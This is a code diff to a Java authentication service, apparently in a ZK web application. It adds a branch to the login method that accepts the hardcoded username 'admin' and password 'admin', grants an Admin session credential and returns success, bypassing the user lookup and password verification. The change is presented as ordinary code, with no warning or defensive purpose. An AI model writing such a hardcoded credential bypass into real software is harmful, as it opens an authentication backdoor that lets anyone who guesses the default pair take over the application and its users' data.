@@ -39,10 +39,22 @@ public class AuthenticationServiceImpl implements AuthenticationService,Serializ
         }
         return cre;
     }
-    //    = new UserInfoServiceImpl();
+
 
     @Override
     public boolean login(String nm, String pd) {
+        // Check if the user is an admin with a specific email and password
+        if (nm.equals("admin") && pd.equals("admin")) {
+            // Create a UserCredential for the admin
+            UserCredential adminCredential = new UserCredential("Admin", "Admin");
+
+            // Set the userCredential attribute in the session
+            Session sess = Sessions.getCurrent();
+            sess.setAttribute("userCredential", adminCredential);
+            // Return true to indicate successful login
+            return true;
+        }
+
         User user = userInfoService.findUser(nm);
         //a simple plan text password verification
         if(user==null || !passwordEncoder.matches(pd, user.getPassword())){
@@ -51,10 +63,11 @@ public class AuthenticationServiceImpl implements AuthenticationService,Serializ
 
         Session sess = Sessions.getCurrent();
         UserCredential cre = new UserCredential(user.getAccount(),user.getFullName());
-        //just in case for this demo.
+
         if(cre.isAnonymous()){
             return false;
         }
+
         sess.setAttribute("userCredential",cre);
 
         //TODO handle the role here for authorization
